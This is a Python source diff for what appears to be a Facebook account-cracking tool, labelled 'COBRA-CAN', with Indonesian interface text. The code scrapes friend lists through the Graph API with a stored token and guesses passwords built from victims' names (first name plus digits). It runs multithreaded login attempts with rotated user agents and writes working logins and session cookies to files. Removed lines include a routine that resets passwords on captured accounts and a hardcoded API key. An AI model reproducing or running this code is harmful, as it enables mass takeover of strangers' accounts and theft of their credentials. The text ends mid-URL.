-	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
-	link=soup.find("form",{"method":"post"})
-	for x in soup("input"):
-		data.update({x.get("name"):x.get("value")})
-	data.update({"email":user,"pass":pw})
-	urlPost=session.post(url+link.get("action"),data=data)
-	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
-	if "c_user" in session.cookies.get_dict():
-		if "Akun Anda Dikunci" in urlPost.text:
-			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
+###----------[ DUMP ID PUBLIK ]----------###
+def dump(idt,fields,cookie,token):
+	try:
+		headers = {
+			"connection": "keep-alive", 
+			"accept": "*/*", 
+			"sec-fetch-dest": "empty", 
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin", 
+			"sec-fetch-user": "?1",
+			"sec-ch-ua-mobile": "?1",
+			"upgrade-insecure-requests": "1", 
+			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
+			"accept-encoding": "gzip, deflate",
+			"accept-language": "id-ID,id;q=0.9"
+		}
+		if len(id) == 0:
+			params = {
+				"access_token": token,
+				"fields": f"name,friends.fields(id,name,birthday)"
+			}
 		else:
-			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
-			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
-	elif "checkpoint" in session.cookies.get_dict():
-		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-		title=re.findall("\<title>(.*?)<\/title>",str(response))
-		link2=response.find("form",{"method":"post"})
-		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
-		for x in response("input"):
-			if x.get("name") in listInput:
-				data2.update({x.get("name"):x.get("value")})
-		an=session.post(url+link2.get("action"),data=data2)
-		response2=bs4.BeautifulSoup(an.text,"html.parser")
-		cek=[cek.text for cek in response2.find_all("option")]
-		number=0
-		print("\r%s%s \033[0m terdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
-		if(len(cek)==0):
-			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
-				if "ubah_sandi" in ubah_pass:
-					dat,dat2={},{}
-					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
-					for x in response("input"):
-						if x.get("name") in but:
-							dat.update({x.get("name"):x.get("value")})
-					ubahPw=session.post(url+link2.get("action"),data=dat).text
-					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
-					link3=resUbah.find("form",{"method":"post"})
-					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
-					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
-						for b in resUbah("input"):
-							dat2.update({b.get("name"):b.get("value")})
-						dat2.update({"password_new":"".join(pwbaru)})
-						an=session.post(url+link3.get("action"),data=dat2)
-						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
-						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
-						#cek_apk(coki)
-				else:
-					print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H,til))
-					tree = Tree(" ",guide_style=f"{color_ok}")
-					tree.add(Panel(f"{H2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
-					prints(tree)
-					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
-					#cek_apk(coki)
-			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
-				print("\r%s\033[0m akun terpasang autentikasi dua faktor			"%(M))
-			else:
-				print("%s%s\033[0mterjadi kesalahan"%(M,til))
-		else:
-			if "c_user" in session.cookies.get_dict():
-				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
-				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
-		for opsi in range(len(cek)):
-			number +=1
-			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
-	elif "login_error" in str(response):
-		oh = run.find("div",{"id":"login_error"}).find("div").text
-		print("%s %s"%(M,oh))
+			params = {
+				"access_token": token,
+				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
+			}
+		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
+		for i in url["friends"]["data"]:
+			#print(i["id"]+"|"+i["name"])
+			id.append(i["id"]+"|"+i["name"])
+			sys.stdout.write(f"\r┗━ 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 : {H}{len(id)}{P}"),
+			sys.stdout.flush()
+		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
+	except:pass
+	
+###----------[ DUMP ID PUBLIK ]----------###
+def nge_crack():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+	    exit()
+	try:
+		kumpulkan = int(input(f'┗━ 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙹𝚄𝙼𝙻𝙰𝙷 𝚃𝙰𝚁𝙶𝙴𝚃 : '))
+	except ValueError:
+	    exit()
+	if kumpulkan<1 or kumpulkan>1000:
+	    exit()
+	ses=requests.Session()
+	bilangan = 0
+	for KOTG49H in range(kumpulkan):
+		bilangan+=1
+		Masukan = input(f'┗━ 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙸𝙳  '+str(bilangan)+f' : ')
+		uid.append(Masukan)
+	for user in uid:
+	    try:
+	       head = (
+	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+	       })
+	       if len(id) == 0:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	          
+	       )
+	       else:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	           
+	       )
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       for xr in url['friends']['data']:
+	           try:
+	               woy = (xr['id']+'|'+xr['name'])
+	               if woy in id:pass
+	               else:id.append(woy)
+	           except:continue
+	    except (KeyError,IOError):
+	      pass
+	    except requests.exceptions.ConnectionError:
+	        exit()
+	try:
+	      print("┗━ 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 : "+str(len(id))) 
+	      atur_dulu()
+	except requests.exceptions.ConnectionError:
+	    exit()
+	except (KeyError,IOError):
+		exit()
+###----------[ CRACK  FILE ]----------###
+def file_dump():
+	mz = 0
+	bzz = {}
+	print('━━'* 25)
+	try:baz_gtg = os.listdir('/sdcard/DUMP-FILE/')
+	except FileNotFoundError:
+		print('┗━ file dump tidak ada ster ')
+		print('┗━ buat file terlebih dahulu ')
+		waktu(2)
+		exit()
+	if len(baz_gtg)==0:
+		print('┗━ file dump tidak ada ster ')
+		print('┗━ buat file terlebih dahulu ')
+		waktu(2)
+		exit()
 	else:
-		tree = Tree(" ",guide_style=f"{color_panel}")
-		tree.add(Panel(f"{O2}login gagal, silahkan cek kembali id dan kata sandi{P2}",width=83,padding=(0,2),style=f"{color_panel}"))
-		prints(tree)
-		  
-def scarpping_ua():
-    # Url & Headers website #
-    
-    
-    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
-    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
-    
-    # Main menu #
-    
-  #  os.system('clear')
-    try:
-        response = requests.get(url,headers=header)
-        if response.status_code == 200:
-            uascrap.append(response.json()['ua'])
-        else:
-            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
-    except requests.exceptions.ConnectionError:
-        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
+		for file_id in baz_gtg:
+			try:pen_file = open('/sdcard/DUMP-FILE/'+file_id,'r').readlines()
+			except:continue
+			mz+=1
+			if mz<100:
+				jumh = ''+str(mz)
+				bzz.update({str(mz):str(file_id)})
+				bzz.update({jumh:str(file_id)})
+				print(f'┗━ %s. %s ({hijo} %s{xxx} )'%(jumh,file_id,len(pen_file)))
+			else:
+				bzz.update({str(mz):str(file_id)})
+				print('['+str(mz)+'] '+file_id+' [ '+str(len(pen_file))+' akun ]'+x)
+				print('┗━ %s. %s ({hijo} %s {xxx}) '%(mz,file_id,len(pen_file)))
+		_chos_baz = input('┗━ : ')
+		try:gaz_sung = bzz[_chos_baz]
+		except KeyError:
+			print(f'┗━ yang bener milihnya {xxx}')
+			waktu(2)
+			file_dump()
+		try:cekz_ = open('/sdcard/DUMP-FILE/'+gaz_sung,'r').read().splitlines()
+		except:
+			print('┗━ filenya tidak ada ')
+			waktu(2)
+			exit()
+		for idnyh in cekz_:
+			id.append(idnyh)
+		atur_duluh()
 		
-###----------[ BAGIAN SESSION HEADERS DAN USER AGENT ]---------- ###
-class Session:
+def atur_duluh():
+	print('━━'* 25)
+	print('┗━ 1. AKUN BARU')
+	print('┗━ 2. AKUN ACAK')
+	print('━━'* 25)
+	aturidh = input(f'{xxx}┗━ : ')
+	if aturidh in ['1','01']:
+		xbaru=[]
+		for baru in sorted(id):
+			xbaru.append(baru)
+		bkp=len(xbaru)
+		bkpp=(bkp-1)
+		for miyabi in range(bkp):
+			id2.append(xbaru[bkpp])
+			bkpp -=1
+	elif aturidh in ['2','02']:
+		for acak in id:
+			xnxx = random.randint(0,len(id2))
+			id2.insert(xnxx,acak)
+	else:
+		baz_anim(f'{puti}┗━ pilih yang bener')
+		waktu(1)
+		atur_duluh()
+		exit()
+		
+	print('━━'* 25)
+	print('┗━ enter untuk mulai crack')
+	print('━━'* 25)
+	metodh = input(f'')
+	if metodh in ['',' ']:
+		xbz.append('metodh1')
+	else:
+		xbz.append('metodh1')
+	passwrdh()
+
+def passwrdh():
+	global prog,des
+	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
+	des = prog.add_task('',total=len(id))
+	with prog:
+		with tred(max_workers=30) as gas_krek:
+			for aldous in id2:
+				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
+				frs = nmf.split(' ')[0]
+				pwv = []
+				pwt = []
+				if len(nmf)<6:
+					if len(frs)<3:
+						pass
+					else:
+						pwv.append(frs+'321')
+						pwv.append(frs+'123')
+						pwv.append(frs+'1234')
+						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+				else:
+					if len(frs)<3:
+						pwv.append(nmf)
+					else:
+						pwv.append(nmf)
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+				if '><basari><' in pwt:
+					for xpwn in pwn:
+						pwv.append(xpwn)
+				else:pass
+				if 'metodh1' in xbz:
+					gas_krek.submit(metodh1,idf,pwv)
+				else:
+					gas_krek.submit(metodh1,idf,pwv)
+		yhg = '0'
+		print('━━'* 25)
+		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
+		print(f'{kun}+ {puti}akun cp : {kun}{yhg}{xxx} ')
+		print('━━'* 25)
+
+def metodh1(idf,pwv):
+	yhn = '0'
+	global loop,ok,cp
+	prog.update(des,description=f'\r [blue]COBRA-CAN [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{yhn}')
+	prog.advance(des)
+	ua = random.choice(ugen)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://m.facebook.com/login/?email='+idf).text
+			dataa ={
+'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
+'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
+'m_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
+'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
+'email':idf,
+'pass':pw
+}
+			ses.headers.update({'Host': 'm.facebook.com',
+'cache-control': 'max-age=0',
+'upgrade-insecure-requests': '1',
+'origin': 'https://m.facebook.com',
+'content-type': 'application/x-www-form-urlencoded',
+'user-agent': ua,
+'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'sec-fetch-site': 'same-origin',
+'sec-fetch-mode': 'cors',
+'sec-fetch-user': 'empty',
+'sec-fetch-dest': 'document',
+'referer': 'https://m.facebook.com/login/?email='+idf,
+'accept-encoding':'gzip, deflate br',
+'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
+
+			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				#print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
+				#open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r┗━ {hijo}{idf}|{pw}|{kuki}\n{xxx}┗━ {hijo}{ua}{xxx}')
+				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			waktu(31)
+	loop+=1
+###----------[ ATUR SBLUM KREK ]----------###
+def atur_dulu():
+	print(' ')
+	print('━━'* 25)
+	print('┗━ 1. JANDA TUA')
+	print('┗━ 2. JANDA MUDA')
+	print('┗━ 3. JANDA PIRANG')
+	print('━━'* 25)
+	aturid = input(f'┗━ 𝙿𝙸𝙻𝙸𝙷 𝚃𝙾𝙳 : ')
+	if aturid in ['1','01']:
+		for tua in sorted(id):
+			id2.append(tua)
+			
+	elif aturid in ['2','02']:
+		xbaru=[]
+		for baru in sorted(id):
+			xbaru.append(baru)
+		bkp=len(xbaru)
+		bkpp=(bkp-1)
+		for miyabi in range(bkp):
+			id2.append(xbaru[bkpp])
+			bkpp -=1
+	elif aturid in ['3','03']:
+		for acak in id:
+			xnxx = random.randint(0,len(id2))
+			id2.insert(xnxx,acak)
+	else:
+		baz_anim(f'{puti}┗━ pilih yang bener')
+		waktu(1)
+		atur_dulu()
+		exit()
+		
+	print('━━'* 25)
+	print('┗━ 1. REGULER')
+	print('┗━ 2. MBASIC')
+	print('┗━ 3. VALIDATE')
+	print('━━'* 25)
+	metod = input(f'┗━ 𝙿𝙸𝙻𝙸𝙷 𝚃𝙾𝙳 : ')
+	if metod in ['1','01']:
+		baz.append('metod1')
+	elif metod in ['2','02']:
+		baz.append('metod2')
+	elif metod in ['3','03']:
+		baz.append('metod3')
+	else:
+		baz.append('metod3')
+		
+	print('━━'* 25)
+	pwplus=input(f'┗━ Tambahkan pw manual (Y/n) {H}:{P} ')
+	print('━━'* 25)
+	if pwplus in ['y','Y']:
+		pwpluss.append('ya')
+		pwku=input(f'┗━ Masukan sandi :  ')
+		pwkuh=pwku.split(',')
+		for xpw in pwkuh:
+			pwnya.append(xpw)
+	else:
+		pwpluss.append('no')
+	passwrd()
+
+###----------[ BAGIAN PASSWRD ]----------###
+def passwrd():
+	global prog,des
+	print('━━'* 25)
+	print(f'       {H}MAINKAN PRAWAN SETIAP 300 ID{xxx}')
+	print('━━'* 25)
+	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
+	des = prog.add_task('',total=len(id))
+	with prog:
+		with tred(max_workers=30) as gas_krek:
+			for aldous in id2:
+				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
+				frs = nmf.split(' ')[0]
+				pwv = []
+				pwt = []
+				if len(nmf)<6:
+					if len(frs)<3:
+						pass
+					else:
+						pwv.append(frs+'123')
+						pwv.append(frs+'1234')
+						pwv.append(frs+'15')
+						pwv.append(frs+'16')
+						pwv.append(frs+'123456789')
+						pwv.append(frs+'14')
+						pwv.append(frs+'234')
+						pwv.append(frs+'345')
+						pwv.append(frs+'456')
+						pwv.append(frs+'567')
+						pwv.append(frs+'678')
+						pwv.append(frs+'07')
+						pwv.append(frs+'08')
+				else:
+					if len(frs)<3:
+						pwv.append(nmf)
+					else:
+						pwv.append(nmf)
+						pwv.append(frs+'13')
+						pwv.append(frs+'10')
+						pwv.append(frs+'321')
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append(frs+'11')
+						pwv.append(frs+'12')
+				if '><basari><' in pwt:
+					for xpwn in pwn:
+						pwv.append(xpwn)
+				else:pass
+				if 'metod1' in baz:
+					gas_krek.submit(metod1,idf,pwv)
+				elif 'metod2' in baz:
+					gas_krek.submit(metod2,idf,pwv)
+				elif 'metod3' in baz:
+					gas_krek.submit(metod3,idf,pwv)
+				else:
+					gas_krek.submit(metod3,idf,pwv)
+		print('━━'* 25)
+		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
+		print(f'{kun}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
+		print('━━'* 25)
+		
+###----------[ REGULAR ]----------###
+def metod1(idf,pwv):
+	global loop,ok,cp
+	prog.update(des,description=f'\r[blue]COBRA-CAN [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.advance(des)
+	ua = random.choice(ugen)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			if 'ya' in ualuh: ua = ualu[0]
+			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://m.facebook.com/login/?email='+idf).text
+			dataa ={
+'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
+'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
+'m_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
+'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
+'email':idf,
+'pass':pw
+}
+			ses.headers.update({'Host': 'm.facebook.com',
+'cache-control': 'max-age=0',
+'upgrade-insecure-requests': '1',
+'origin': 'https://m.facebook.com',
+'content-type': 'application/x-www-form-urlencoded',
+'user-agent': ua,
+'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'sec-fetch-site': 'same-origin',
+'sec-fetch-mode': 'cors',
+'sec-fetch-user': 'empty',
+'sec-fetch-dest': 'document',
+'referer': 'https://m.facebook.com/login/?email='+idf,
+'accept-encoding':'gzip, deflate br',
+'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
+
+			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				print(f'\r┗━ {kun}{idf}|{pw}\n{xxx}┗━ {mer}{ua}{xxx}')
+				#os.popen('play-audio c.mp3')
+				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r┗━ {hijo}{idf}|{pw}|{kuki}\n{xxx}┗━ {hijo}{ua}{xxx}')
+				#os.popen('play-audio o.mp3')
+				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			waktu(31)
+	loop+=1
+###----------[ ASYNC ]----------###
+def metod2(idf,pwv):
+	global loop,ok,cp
+	prog.update(des,description=f'\r[blue]COBRA-CAN [white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.advance(des)
+	ua = random.choice(ugen)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			if 'ya' in ualuh: ua = ualu[0]
+			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&api_key=525265914179580&kid_directed_site=0&app_id=525265914179580&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3D4746b630-c014-4717-b1bc-9c1d6922f6ed%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26scope%3Demail%252Cpublic_profile%252Copenid%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1c14ca10-f5d6-42e9-bf43-79d4d8eaf557%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.canva.com%2Foauth%2Fauthorized%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4746b630-c014-4717-b1bc-9c1d6922f6ed%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={
+            "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
+            "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
+            "uid": idf,
+            "next": "https://mbasic.facebook.com/v16.0/dialog/oauth?state=4746b630-c014-4717-b1bc-9c1d6922&response_type=code&client_id=525265914179580&redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26scope%3Demail%252Cpublic_profile%252Copenid%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1c14ca10-f5d6-42e9-bf43-79d4d8eaf557%26tp%3Dunspecified",
+            "flow": "login_no_pin",
+            "pass": pw,
+            }
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2; wd=360x648'
+			heade={
+            'Host': 'mbasic.facebook.com',
+            'cache-control': 'max-age=0',
+            'dpr': '1',
+            'viewport-width': '384',
+            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"15.0.0"',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="119.0.6045.160", "Chromium";v="119.0.6045.160", "Not?A_Brand";v="24.0.0.0"',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'upgrade-insecure-requests': '1',
+            'content-type': 'application/x-www-form-urlencoded',
+            'user-agent': ua,
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&api_key=525265914179580&kid_directed_site=0&app_id=525265914179580&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3D4746b630-c014-4717-b1bc-9c1d6922f6ed%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26scope%3Demail%252Cpublic_profile%252Copenid%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1c14ca10-f5d6-42e9-bf43-79d4d8eaf557%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.canva.com%2Foauth%2Fauthorized%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4746b630-c014-4717-b1bc-9c1d6922f6ed%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+            'accept-language': 'en-US,en;q=0.9'
+            }
+			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				print(f'\r┗━ {kun}{idf}|{pw}\n{xxx}┗━ {mer}{ua}{xxx}')
+				#os.popen('play-audio c.mp3')
+				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r┗━ {hijo}{idf}|{pw}\n{xxx}┗━{B}{kuki}\n{xxx}┗━ {ua}{xxx}')
+				#os.popen('play-audio o.mp3')
+				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			waktu(31)
+	loop+=1
+###----------[ VALIDATE ]----------###
+def metod3(idf,pwv):
+	global loop,ok,cp
+	prog.update(des,description=f'\r[blue]COBRA-CAN [white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.advance(des)
+	ua = random.choice(ugen)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			if 'ya' in ualuh: ua = ualu[0]
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&api_key=2572246932852997&kid_directed_site=0&app_id=2572246932852997&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fapp_id%3D2572246932852997%26cbt%3D1701324889315%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df19ad207fd5edc%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%26client_id%3D2572246932852997%26display%3Dtouch%26domain%3Dmyim3app.indosatooredoo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252F%2523%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df1591e23a79190c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df183c91f29c2034%2526domain%253